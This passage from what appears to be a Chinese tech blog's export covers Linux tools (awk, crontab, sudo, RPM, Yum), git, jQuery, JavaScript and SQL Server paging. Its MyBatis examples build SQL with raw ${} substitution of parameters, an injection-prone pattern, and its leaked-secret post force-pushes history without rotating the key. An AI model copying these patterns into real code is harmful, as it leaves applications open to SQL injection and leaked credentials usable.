打印出行号和用户名awk -F ':' '&#123;print NR"\t"$1&#125;' /tmp/passwdawk -F ':' '&#123;printf("%s\t%s\n", NR, $1)&#125;' /tmp/passwd 逻辑计算1awk [option] &apos;[BEGIN&#123;awk 操作命令&#125;]pattern&#123;awk 操作命令&#125;[END&#123;awk 操作命令&#125;]&apos; file(s) 这里的BEGIN和END可以进行一些初始化操作和结尾操作。 1234567891011121314# 1. 统计 / 文件夹下所有文件的大小总和, BEGIN可以声明变量ll / | awk 'BEGIN&#123;size=0&#125;&#123;size+=$5&#125;END&#123;print "size:"size/1024/1024"M"&#125;'# 2. 统计 /etc/passwd 下有多少个用户, 用正则表达式 ^$ 排除空行awk -F ':' 'BEGIN&#123;count=0&#125;$1!~/^$/&#123;count++&#125;END&#123;print "count:"count&#125;' /etc/passwd# 3. 打印出UID大于100的行号和用户名, 加上表头和表尾awk -F ':' 'BEGIN&#123;print "NR\tUsername"&#125;&#123;if($3&gt;100) print NR"\t"$1&#125;END&#123;print "-------"FILENAME"-------"&#125;' /etc/passwd# 4. 使用数组记录所有UID大于100的用户名awk -F ':' 'BEGIN&#123;count=0&#125;&#123;if($3&gt;100)name[count++]=$1&#125;END&#123;for(i=0;i&lt;count;i++) print i"\t"name[i]&#125;' /etc/passwd# 5. 分别统计LISTEN和CONNECTED的连接数量netstat -anp | awk '$6~/(LISTEN)|(CONNECTED)/&#123;sum[$6]++&#125;END&#123;for(i in sum) print i" : "sum[i]&#125;']]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GitHub删除敏感commit]]></title>
    <url>%2Fposts%2FDelete_sensitive_submissions_in_Github.html</url>
    <content type="text"><![CDATA[前言GitHub上提交项目时, 有时会把密钥等敏感信息不小心提交上去, 这时候需要删除commit。而GitHub自身是不支持删除commit的, 需要借助Git来删除。 操作打开一个文件夹, 在里面打开Git命令行。 1234567891011# 1. clone 整个项目$ git clone 项目路径# 2. 查看最近4条commit记录$ git log -n 4commit abcdefg1234567 (HEAD -&gt; master, origin/master, origin/HEAD)Author: Ahaochan &lt;844394093@qq.com&gt;Date: Wed Jan 3 09:06:34 2018 +0800# 3. 根据commit-id回滚git reset --hard abcdefg1234567 # 4. 强制push到GitHub上git push --force 参考资料 5.2 代码回滚：Reset、Checkout、Revert 的选择]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery的clone陷阱]]></title>
    <url>%2Fposts%2FCloning_trap_of_jQuery.html</url>
    <content type="text"><![CDATA[前言clone() 方法生成被选元素的副本，包含子节点、文本和属性。这里的属性, 包括了 id。当clone了id后, 获取id将会获取第一个匹配id的元素。造成不可预期的后果。 例子Demo地址12345678910111213141516171819202122&lt;div&gt; &lt;button id="btn"&gt;复制时间到第一个div中&lt;/button&gt; &lt;div class="div-clone"&gt; &lt;/div&gt; &lt;hr/&gt; &lt;div class="div-source"&gt; &lt;p id="time"&gt;&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;&lt;script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"&gt;&lt;/script&gt;&lt;script&gt;$('#btn').click(function()&#123; // 1. 更新 div-source 中的时间 var $time = $('#time'); $time.html('时间:'+new Date()); // 2. clone 到 div-clone 中 var $clone = $time.clone(); $('.div-clone').html($clone);&#125;);&lt;/script&gt; 分析这是一个简单的页面, 每点击一次按钮, 就会更新div-source的时间, 再复制到div-clone中。当第一次点击时, 页面如下, div-clone复制成功。 更新id为time的元素文本为 现在的时间 复制id为time的元素文本 粘贴到div-clone里面12345678910&lt;div&gt; &lt;button id="btn"&gt;复制时间到第一个div中&lt;/button&gt; &lt;div class="div-clone"&gt; &lt;p id="time"&gt;时间:Wed Mar 14 2018 14:53:15 GMT+0800 (中国标准时间)&lt;/p&gt; &lt;/div&gt; &lt;hr&gt; &lt;div class="div-source"&gt; &lt;p id="time"&gt;时间:Wed Mar 14 2018 14:53:15 GMT+0800 (中国标准时间)&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 问题出在第二次点击时, 只会更新第一个div, 不更新第二个div 更新div-clone下的id为time的元素文本为 现在的时间, 因为现在id为time的元素有两个。会更新第一个元素，也就是div-clone下的id为time的元素 复制div-clone下的id为time的元素文本 粘贴到div-clone里面 div-source没被操作1234567891011121314151617181920212223&lt;div&gt; &lt;button id="btn"&gt;复制时间到第一个div中&lt;/button&gt; &lt;div class="div-clone"&gt; // 注意这里!!!有两个id为time的元素 &lt;p id="time"&gt;时间:Wed Mar 14 2018 15:01:05 GMT+0800 (中国标准时间)&lt;/p&gt; &lt;/div&gt; &lt;hr&gt; &lt;div class="div-source"&gt; // 注意这里!!!有两个id为time的元素 &lt;p id="time"&gt;时间:Wed Mar 14 2018 14:53:15 GMT+0800 (中国标准时间)&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;&lt;script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"&gt;&lt;/script&gt;&lt;script&gt;$('#btn').click(function()&#123; // 第二次点击, 预期是更新 div-source 的时间, 实际会更新 div-clone 中的时间 var $time = $('#time'); $time.html('时间:'+new Date()); var $clone = $time.clone(); $('.div-clone').html($clone);&#125;);&lt;/script&gt; 总结clone最好不要复制带有id属性的元素, 否则会发生不可预期的错误。 参考资料 jQuery 文档操作 - clone() 方法]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[call和apply的区别]]></title>
    <url>%2Fposts%2FThe_difference_between_call_and_apply.html</url>
    <content type="text"><![CDATA[两者的异同call 和 apply 都是为了改变 this 而存在的。两者可以说是完全一致, 唯一的不同就在于接收的参数的形式不同。 call: 接收多个参数 apply: 接收一个数组参数 1234567891011121314151617181920212223242526// 函数功能, 打印 this 和 所有参数function f()&#123; console.log("this:"+this); for(var i in arguments)&#123; console.log("arguments["+i+"]="+arguments[i]); &#125;&#125;f(1,2,3);// this:[object Window]// arguments[0]=1// arguments[1]=2// arguments[2]=3f.call('我是this', 1,2,3); // 接收多个参数// this:我是this// arguments[0]=1// arguments[1]=2// arguments[2]=3var arr = [1,2,3];f.apply('我是this', arr); // 接收一个数组参数// this:我是this// arguments[0]=1// arguments[1]=2// arguments[2]=3 可以粗略的理解为如下Java代码12public void f1(String... strs);public void f2(String[] strs);]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL Server分页]]></title>
    <url>%2Fposts%2Fpaging_query_of_SQL_Server.html</url>
    <content type="text"><![CDATA[环境基于Mybatis的动态SQL。使用fastjson格式化输出数据。 1234567891011121314@Repositorypublic interface StudentDao &#123; List&lt;Map&lt;String, Object&gt;&gt; getStudent(@Param("sex") String sex, @Param("page") int page, @Param("pageSize") int pageSize);&#125;public class MyTest &#123; private StudentDao dao; public void test() &#123; // 查找性别为男, 分页大小为10, 的第2页数据 List&lt;Map&lt;String, Object&gt;&gt; data = dao.getStudent("男", 2, 10); System.out.println(JSONObject.toJSONString(data)); &#125;&#125; SQL Server 2005在2005之后, 使用ROW_NUMBER()函数标记记录的行号, 然后再使用where进行筛选。1234567891011121314151617&lt;select id="getStudent" resultType="Map"&gt; &lt;bind name="skip" value="(page-1)*pageSize"/&gt; &lt;bind name="record" value="page*pageSize"/&gt; SELECT * FROM ( SELECT TOP 100 PERCENT tmp.*, ROW_NUMBER() OVER (ORDER BY tmp.birthday desc) AS row_num FROM ( SELECT DISTINCT s.id, s.name, CONVERT (VARCHAR(10), s.birthday, 120) AS birthday FROM student s WHERE s.sex = $&#123;sex&#125; ORDER BY s.birthday ) tmp ORDER BY row_num ) tmp &lt;![CDATA[WHERE row_num &gt; $&#123;skip&#125; and row_num &lt;= $&#123;record&#125;]]&gt;&lt;/select&gt; SQL Server 2012在2012之后, 使用OFFSET FETCH 子句进行分页处理。12345678&lt;select id="getStudent" resultType="Map"&gt; &lt;bind name="skip" value="(page-1)*pageSize"/&gt; SELECT DISTINCT s.id, s.name, CONVERT (VARCHAR(10), s.birthday, 120) AS birthday FROM student s WHERE s.sex = $&#123;sex&#125; ORDER BY s.birthday OFFSET $&#123;skip&#125; ROWS FETCH NEXT $&#123;pageSize&#125; ROWS ONLY;&lt;/select&gt;]]></content>
      <categories>
        <category>SQL Server</category>
      </categories>
      <tags>
        <tag>SQL Server</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下的定时任务]]></title>
    <url>%2Fposts%2FTiming_tasks_of_Linux.html</url>
    <content type="text"><![CDATA[前言同步数据之类的工作需要定时去完成, 如果要人工去做, 那是费时费力的。既然是定时, 有规律可循, 那就应该使用编程完成, 而不是依赖人力完成。Java 有 Quartz 可以完成。Linux 和 Windows 也有相同的工具。 一次执行和多次执行一次执行: at命令, 需要atd服务的支持。多次执行: crontab命令, 需要crond服务的支持。 只执行一次的定时任务打开atd服务123456# 确保打开 atd[root@localhost ~]# /etc/init.d/atd restart停止 atd： [确定]启动 atd： [确定]# 将启动 atd 服务写入配置文件, 开机自动打开[root@localhost ~]# chkconfig atd on 指定允许使用at的用户at 有两个重要的文件, 用来限制可以使用at定时任务的用户。一个用户名占一行。/etc/at.allow白名单和/etc/at.deny黑名单。at根据文件是否存在判断使用白名单或者黑名单。 /etc/at.allow /etc/at.deny 说明 √ 无论是否存在 只允许/etc/at.allow的用户执行at × √ 禁止/etc/at.deny的用户执行at × × 只有root能执行at 例子123456789101112131415161718192021222324252627# 1. 创建一次性的5分钟后创建文件的定时任务[root@localhost ~]# at -m now + 5 minutes at&gt; cat 'now+5minutes file' &gt; /tmp/now+5minutes.fileat&gt; echo 'execute at task' # 使用 -m 选项可以将输出信息发送到email中at&gt; &lt;EOT&gt; # 按Ctrl+D结束输入job 6 at 2017-10-19 04:31# 2. 查看at定时任务队列(queue), 或者 at -l[root@localhost ~]# atq6 2017-10-19 04:31 a root# 3. 查询定时任务的内容, -c 指定任务号[root@localhost ~]# at -c 6#!/bin/sh# 省略一堆环境变量# 进入创建定时任务时所在的文件夹cd /root || &#123; echo 'Execution directory inaccessible' &gt;&amp;2 exit 1&#125;cat 'now+5minutes file' &gt; /tmp/now+5minutes.fileecho 'execute at task'# 4. 根据任务号6, 移除(remove)定时任务[root@localhost ~]# atrm 6# 5. 再次查看任务列表, 没有定时任务, 已经被删除了[root@localhost ~]# atq 其他的时间格式除了用now + 5 minutes指定时间外, 还有其他的时间格式 时间格式 说明 HH:MM 在HH时MM分执行一次 HH:MM YYYY-MM-DD 在YYYY年MM月DD日HH时MM分执行一次 HH:MM[am/pm] [Month] [Date] 在Month月Date日早上/下午HH时MM分执行一次, 月份是英文表示 HH:MM[am/pm] + number [minutes/hours/days/weeks] 在早上/下午HH时MM分的number分钟/小时/天/周后执行一次 batch空闲时运行batch可以控制在工作负载低于0.8的时候执行一次定时任务。工作负载为1, 说明这个时间点有1个程序在运行。工作负载为2, 说明这个时间点有2个程序在运行。负载越高, 说明CPU单位时间内切换程序的次数越多。当然, 程序不可能一直在运算, 所以也有低于1的情况产生。batch可以避免在程序繁忙的时候执行一些操作, 比如定时重启。让定时任务延后运行。可以看到最后一行代码是执行了at命令, 只是附带了一些参数而已。和at命令一样的用法。12[root@localhost ~]# nl /usr/bin/batch42 exec /usr/bin/at $OPT_f $OPT_m $OPT_q $OPT_v $OPT_V $time_date_arg 多次执行的定时任务Java下有Quartz这个定时任务框架, 也使用到了corn表达式。Linux下的多次执行的定时任务是通过cron服务实现的。检查crontab工具是否安装: crontab -l检查crond服务是否启动: service crond status 指定允许使用cron的用户和at一样, cron也有两个文件用来限制可以使用cron定时任务的用户。一个用户名占一行。/etc/cron.allow白名单和/etc/cron.deny黑名单。 /etc/cron.allow /etc/cron.deny 说明 √ 无论是否存在 只允许/etc/cron.allow的用户执行cron × √ 禁止/etc/cron.deny的用户执行cron × × 只有root能执行cron 配置文件/etc/crontab文件存储了系统的定时任务/var/spool/cron/用户名文件存储了各个用户的定时任务/etc/cron.allow文件指定了允许执行定时任务的白名单/etc/cron.deny文件指定了允许执行定时任务的黑名单 通过查看/etc/crontab可以看到看到系统的定时任务1234567891011[root@localhost ~]# cat /etc/crontab SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=rootHOME=/# run-parts 后面跟一个目录, 可以执行目录下所有可执行文件01 * * * * root run-parts /etc/cron.hourly02 4 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly cron表达式从上可以看出cron表达式的格式如下 分 时 日 月 星期几 用户名 命令 取值范围 0~59 0~23 1~31 1~12 0~7(0或7都是星期天) 可选 命令 12345678910111213[root@localhost ~]# whoahao pts/1 2017-10-19 06:40 (192.168.94.121)# 1. 编辑任务, 每分钟输出一次hello到终端屏幕/dev/pts/1上[root@localhost ~]# crontab -e*/1 * * * * echo 'hello' &gt; /dev/pts/1# 2. 查看定时任务列表[root@localhost ~]# crontab -l*/1 * * * * echo 'hello' &gt; /dev/pts/1# 3. 清空定时任务, 单项删除用 crontab -e 编辑[root@localhost ~]# crontab -r 例子具体的用法, 只要看懂下面几个例子就行了123456789101112131415161718192021222324252627# 每天21:30重启apache30 21 * * * service httpd restart# 每月1、10、22日4:45重启apache, 逗号表示或45 4 1,10,22 * * service httpd restart# 每月的1-10日4:45重启apache, 横杠表示区间45 4 1-10 * * service httpd restart# 每隔2分钟重启apache, 斜杠表示每隔一段时间*/2 * * * * service httpd restart# 每天23点到7点每隔1小时重启apache0 23-7/1 * * * service httpd restart# 每天18:00到23:00每隔30分钟重启apache*/30 18-23 * * * service httpd restart# 4月的1-7号或每个星期日早晨1时59分重启apache59 1 1-7 * 4 0 service httpd restart# 4月的第1个星期日早晨1时59分重启apache, 第三个时间位置和第五个时间位置是【或】的关系59 1 1-7 4 * test $(date +%w) -eq 0 &amp;&amp; service httpd restart# 每30秒重启apache, 通过sleep进行精确到秒级的操作, 注意要两个任务都存在*/1 * * * * service httpd restart*/1 * * * * sleep 30s; service httpd restart 参考资料 at命令 crontab命令]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux之sudo权限]]></title>
    <url>%2Fposts%2Fsudo_permissions_of_Linux.html</url>
    <content type="text"><![CDATA[前言sudo权限, 是可以临时把用户变成另一个用户(比如root)去执行某个命令。 添加sudo权限使用visudo命令。即可修改/etc/sudoers文件。切换到最后一行。输入命令即可。格式如下12用户名 允许sudo的远程ip=(可使用的身份) 授权命令(绝对路径)%组名 允许sudo的远程ip=(可使用的身份) 授权命令(绝对路径) 比如shutdown -r now重启命令, 不能被普通用户执行。现在要赋予ahao用户重启服务器的权限。命令越详细, 权限越小。最好写绝对路劲。1ahao ALL=(ALL) /sbin/shutdown -r now 这里的ALL=(ALL)的意思是 左边的ALL, 表示被管理的主机的地址, 即是哪个远程主机或ip登录的这台服务器。 右边的ALL, 表示用户可使用的身份, 省略的话会赋予root权限。 下面是个简单的例子123456789101112131415# 1. 临时切换为 root , 执行 visudo[ahao@localhost ~]$ su -c "/usr/sbin/visudo" root ahao ALL=(ALL) /sbin/shutdown -r now# 2. 查看可用sudo命令[ahao@localhost ~]$ sudo -l 用户 ahao 可以在该主机上运行以下命令： (ALL) /sbin/shutdown -r now# 3. 普通用户执行sudo赋予的命令[ahao@localhost ~]$ sudo /sbin/shutdown -r now # 4. root用户可以随意切换用户, 随意执行sudo命令# 下面root以user1的身份创建/tmp/hello文件[root@localhost ~]# sudo -u user1 touch /tmp/hello[root@localhost ~]# ls -l /tmp/hhh -rw-r--r-- 1 user1 user1 0 10-18 08:29 /tmp/hello sudo支持正则、取反添加以下规则12ahao ALL=/usr/sbin/useradd # 赋予用户创建角色的权限ahao ALL=/usr/bin/passwd # 赋予用户修改密码的权限, 危险!! 为ahao用户添加创建角色的权限, 还要添加修改密码的权限, 才能真正使用创建的用户。但是如果使用上述规则, 则会允许ahao执行/usr/bin/passwd root修改root的密码, 这样很不安全。 修改为以下规则123ahao ALL=/usr/sbin/useraddahao ALL=/usr/bin/passwd [A-Za-z]*, !/usr/bin/passwd &quot;&quot;, !/usr/bin/passwd root# 使用正则表达式限定用户名为字母的用户, 使用 ! 取反, 不允许修改root的密码 sudo的别名调用visudo命令, 插入别名, 别名名称必须大写, 多个值用逗号分隔。 用户别名: User_Alias MYUSER = user1, user2, user3 主机别名: Host_Alias MYHOST = 192.168.0.1, 192.168.0.2 命令别名: Cmnd_Alias MYCMD = !/usr/bin/passwd, /usr/bin/passwd [A-Za-z]*, !/usr/bin/passwd root 警告sudo很容易造成不安全的行为, 如同上面的修改密码的权限。所以在使用的时候一定要注意安全问题。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在已搭建的SSM环境直接执行sql语句]]></title>
    <url>%2Fposts%2Fexecute_sql_statement_in_SSM_environment.html</url>
    <content type="text"><![CDATA[前言这几天遇到个需求, 需要用Java代码对数据处理后批量执行一些SQL语句, 这种是一次性的需求。写一个Mapper.xml又显得太繁琐。自己写JDBC又要重新加载数据库驱动创建数据库连接，更累。 思路编写Class代码不可取。缺点有二: 修改Class需要重启Tomcat。 需要把Class设置为一个Controller。 改为使用JSP。以上两个缺点都没了。 使用JdbcTemplate因为是一次性的需求。写一个Mapper.xml又显得太繁琐。干脆就直接舍弃获取Mybatis SqlSession的方式。使用Spring Jdbc自带的JdbcTemplate。 在Spring配置文件中添加JdbcTemplate Bean。123&lt;bean id="jdbcTemplate" class="org.springframework.jdbc.core.JdbcTemplate"&gt; &lt;constructor-arg name="dataSource" ref="dataSource"/&gt;&lt;/bean&gt; 在JSP页面获取这个Bean12345678910&lt;%@page language="java" contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %&gt;&lt;% // 1. 获取上下文 WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(getServletConfig().getServletContext()); // 2. 获取Bean JdbcTemplate template = (JdbcTemplate) context.getBean("jdbcTemplate"); // 3. 执行sql语句 ( 使用fastjson转化为json格式 ) List list = template.queryForList("select * from mytable"); out.print("测试:"+ JSONObject.toJSONString(list));%&gt;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何优雅的使用GitHub的js脚本]]></title>
    <url>%2Fposts%2FThe_Best_Practices_for_Using_GitHub's_JavaScript.html</url>
    <content type="text"><![CDATA[前言GitHub上有很多优秀的开源脚本, 但是不能直接使用, 需要下载下来保存在自己的项目中。如果是使用JSFiddle进行演示的话, 只能通过url引用(当然如果你不嫌累长篇大段的CV大法另当别论)。即使是直接引用raw也会抛出异常, GitHub的raw文件的MIME type(Internet media type)为text/plain。而&lt;script&gt;要求为application/javascript。1Refused to execute script from &apos;http://raw.githubusercontent.com/user/repo/branch/file.js&apos; because its MIME type (&apos;text/plain&apos;) is not executable, and strict MIME type checking is enabled. 解决方案其实GitHub自己就提供了解决方案。只要将raw.githubusercontent.com替换为rawgit.com(非生产环境)或cdn.rawgit.com即可。项目生产环境最好使用cdn。 比如http://raw.githubusercontent.com/user/repo/branch/file.js替换为http://cdn.rawgit.com/user/repo/tag/file.js 参考资料 Link and execute external JavaScript file hosted on GitHub]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[检测F12控制台是否开启]]></title>
    <url>%2Fposts%2FCheck_whether_the_F12_console_is_turned_on.html</url>
    <content type="text"><![CDATA[前言吧友提到了拦截控制台的情况。别人页面中有个js文件,无法调试.有啥办法解除这个限制.于是好奇找了下stackoverflow, Find out whether Chrome console is open, 但是代码不太懂。后来dalao告诉我知乎有篇文章: 前端开发中如何在JS文件中检测用户浏览器是否打开了调试面板（F12打开开发者工具）？ Chrome 适用(截止至63.0.3239.108)在控制台打开的时候, 打印html元素会去取id属性的值, 只要覆盖id属性的get方法, 就可以判断是否开启控制台。 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;body&gt;status: &lt;div id="devtool-status"&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"&gt;&lt;/script&gt;&lt;script&gt;var checkStatus;// 1. 创建一个html元素, 不能使用普通Object, 两者日志处理方式不同var element = new Image();//var element = document.createElement('any');// 2. 重新定义该元素的get方法Object.defineProperty(element, 'id', &#123; get:function() &#123; checkStatus='on'; &#125;&#125;);// 3. 定时检测控制台是否打开setInterval(function() &#123; checkStatus = 'off'; // 3.1 不使用log, 使用debug, 避免污染控制台 console.debug(element); document.querySelector('#devtool-status').innerHTML = checkStatus;&#125;, 1000)&lt;/script&gt;&lt;/html&gt; Firefox 适用(截止至57.0.4)打印普通对象的日志会调用该对象的toString方法。123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;body&gt;status: &lt;div id="devtool-status"&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"&gt;&lt;/script&gt;&lt;script&gt;var checkStatus;var devtools = /./;devtools.toString = function() &#123; checkStatus = 'on';&#125;setInterval(function() &#123; checkStatus = 'off'; console.log(devtools); document.querySelector('#devtool-status').innerHTML = checkStatus;&#125;, 1000)&lt;/script&gt;&lt;/html&gt; 参考资料 Find out whether Chrome console is open 突破前端反调试–阻止页面不断debugger 前端开发中如何在JS文件中检测用户浏览器是否打开了调试面板（F12打开开发者工具）？]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用JavaScript判断浏览器类型]]></title>
    <url>%2Fposts%2FUse_JavaScript_to_determine_browser_type.html</url>
    <content type="text"><![CDATA[前言使用User-Agent判断浏览器是不可靠的。因为使用控制台可以随意的伪装User-Agent。 代码使用各浏览器特有的属性进行检测1234567891011121314151617181920// Opera 8.0+var isOpera = (!!window.opr &amp;&amp; !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') &gt;= 0;// Firefox 1.0+var isFirefox = typeof InstallTrigger !== 'undefined';// Safari 3.0+ "[object HTMLElementConstructor]" var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) &#123; return p.toString() === "[object SafariRemoteNotification]"; &#125;)(!window['safari'] || (typeof safari !== 'undefined' &amp;&amp; safari.pushNotification));// Internet Explorer 6-11var isIE = /*@cc_on!@*/false || !!document.documentMode;// Edge 20+var isEdge = !isIE &amp;&amp; !!window.StyleMedia;// Chrome 1+var isChrome = !!window.chrome &amp;&amp; !!window.chrome.webstore;// Blink engine detectionvar isBlink = (isChrome || isOpera) &amp;&amp; !!window.CSS; 参考资料 User-Agent MDN List of User Agent Strings How to detect Safari, Chrome, IE, Firefox and Opera browser?]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux软件安装之RPM包详解]]></title>
    <url>%2Fposts%2FRPM_package_installation_of_Linux_software.html</url>
    <content type="text"><![CDATA[前言RPM包管理员是在Linux下广泛使用的软件包管理器。 数据源RPM包一般在系统光盘里就有。不同系统的RPM包在不同的路径下。CentOS5在CentOS目录下。12345678# 1. 先装入系统安装光盘, 切换到 root 用户[ahao@locathost /]$ su -# 2. 挂载光盘到 /mnt/cdrom 目录, 目录需要手动创建[root@locathost /]# mount -t auto /dev/cdrom /mnt/cdrom# 3. 查看 RPM 包目录, 不同光盘的 RPM 包目录不同[root@locathost /]# ll /mnt/cdrom/CentOS# 4. 在用完之后记得卸载光盘[root@locathost /]# umount /mnt/cdrom RPM包命名规则这里以Apache的httpd包为例12[root@localhost /]# ll /mnt/cdrom/CentOS | grep 'httpd'-rw-r--r-- 2 root root 1280858 2009-03-17 httpd-2.2.3-22.el5.centos.x86_64.rpm httpd 2.2.3 22 el5.centos x86_64 rpm 软件包名 软件版本 软件发布次数 适合的Linux平台 适合的硬件平台 rpm包扩展名 RPM查询包和包之间可能存在依赖关系, 比如软件A需要调用软件B, 那么安装软件A之前就必须安装软件B, 否则可能会出现找不到软件B的某个函数的问题。这叫做树形依赖, 其他还有其他依赖。 树形依赖: a -&gt; b -&gt; c, 安装c需要先安装b, 安装b需要先安装a, 卸载的时候要先卸载a, 再卸载b, 最后卸载c 环形依赖: a -&gt; b -&gt; c -&gt; a, 用一条命令同时安装, rpm -ivh a b c 模块依赖: 依赖另一个包的某个so库文件模块, 查询模块对应的软件: www.rpmfind.net 以httpd包为例, 已安装的软件包在/var/lib/rpm/数据库中, 只用输入包名即可。123456789101112131415161718# 1. 安装httpd软件包, -i 安装, -v 显示详细信息, -h 显示进度, # 会发现安装失败, 需要解决依赖性问题, 将依赖的包依次安装即可[root@localhost /]# rpm -ivh /mnt/cdrom/CentOS/httpd-2.2.3-22.el5.centos.x86_64.rpm # 2. 查询所有已安装的RPM包, -q 查询, -a 查询所有[root@localhost /]# rpm -qa# 3. 查询包信息, -i 包信息, -p 未安装的包[root@localhost /]# rpm -qi httpd[root@localhost /]# rpm -qip /mnt/cdrom/CentOS/httpd-2.2.3-22.el5.centos.x86_64.rpm # 4. 查询包所有文件安装位置[root@localhost /]# rpm -ql httpd[root@localhost /]# rpm -qlp /mnt/cdrom/CentOS/httpd-2.2.3-22.el5.centos.x86_64.rpm# 5. 查询文件名属于哪个包[root@localhost /]# rpm -qf /etc/httpd/httpd-2.2.3-22.el5.centos# 6. 升级httpd包, 除非是重大安全漏洞, 避免升级[root@localhost /]# rpm -U httpd# 7. 卸载http包, 需要解决依赖性问题[root@localhost /]# rpm -e httpd RPM验证有时候网络波动或网络攻击会导致文件缺失或者文件被植入木马等问题, 就需要验证下载下来的文件和RPM包的文件是否一致。 12345# 1. 修改 httpd 包的配置文件 httpd.conf, 随便添加几个字符[root@localhost ~]# vim /etc/httpd/conf/httpd.conf# 2. verify 校验RPM包中的文件, 发现被修改过了, S.5....T 对应表一, c 对应表二[root@localhost ~]# rpm -V httpdS.5....T c /etc/httpd/conf/httpd.conf S(Size) M(Mode) 5(MD5) D(Device) L(Link) U(User) G(Group ) T(mTime) 文件大小 文件类型或文件权限 MD5校验 设备主从代码 文件路径 文件所有者 文件所属组 文件修改时间 c(config) d(documentation) g(ghost) L(license) r(readme) 配置文件 普通文件 不在RPM包的幽灵文件 授权文件 描述文件 123456789# 3. 使用 rpm2cpio 将 rpm 包中转为 cpio, 再通过 cpio 提取其中的 ./etc/httpd/conf/httpd.conf 文件, 保存到 /tmp 目录下# -i copy-in模式还原, -d 还原时自动新建目录, -v verbose 显示还原过程[root@localhost ~]# cd /tmp[root@localhost /tmp]# rpm2cpio /mnt/cdrom/CentOS/httpd-2.2.3-22.el5.centos.x86_64.rpm | cpio -idv ./etc/httpd/conf/httpd.conf# 4. 覆盖被改变的 httpd.conf[root@localhost /tmp]# cp /tmp/etc/httpd/conf/httpd.conf /etc/httpd/conf/httpd.conf# 5. 再次校验RPM包, 发现没有异常, 只有时间被修改了[root@localhost tmp]# rpm -V httpd.......T c /etc/httpd/conf/httpd.conf]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux软件安装</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux软件安装之Yum详解]]></title>
    <url>%2Fposts%2FYum_installation_of_Linux_software.html</url>
    <content type="text"><![CDATA[前言Yum(Yellow dog Updater, Modified)是一个基于RPM包管理的字符前端软件包管理器。能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。不支持RPM查询和校验。 Yum配置文件配置文件在/etc/yum.repos.d/目录下1234567891011121314151617[root@localhost /]# cat /etc/yum.repos.d/CentOS-Base.repo [容器名]name=容器说明mirrorlist=镜像站点, 当baseurl无法访问时启用#baseurl=Yum服务器地址enabled=0禁用, 1启用, 默认启用gpgcheck=0表示RPM数字证书失效, 1表示生效gpgkey=数字证书的公钥文件保存位置[base]name=CentOS-$releasever - Basemirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-5# 省略其他容器 使用阿里云Yum源: CentOS配置好repo文件后, 清空缓存即可。注意, CentOS5已经过时, 很多网站都放弃了CentOS5的Yum源12[root@localhost /]# yum clean all[root@localhost /]# yum makecache 使用系统光盘创建本地Yum源Yum(Yellow dog Updater, Modified)是一个基于RPM包管理的字符前端软件包管理器。系统光盘自带了一堆RPM包, 也就是说, 使用系统光盘也可以创建一个本地的无需联网的Yum源。12345678910111213141516171819202122# 1. 移除Yum网络源[root@localhost /]# mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak# 2. 挂载光盘到 /mnt/cdrom 路径下[root@locathost /]# mount -t auto /dev/cdrom /mnt/cdrom# 2. 将挂载后的系统光盘路径设置为本地Yum源地址[root@localhost /]# vim /etc/yum.repos.d/CentOS-Media.repo[c5-media]name=CentOS-$releasever 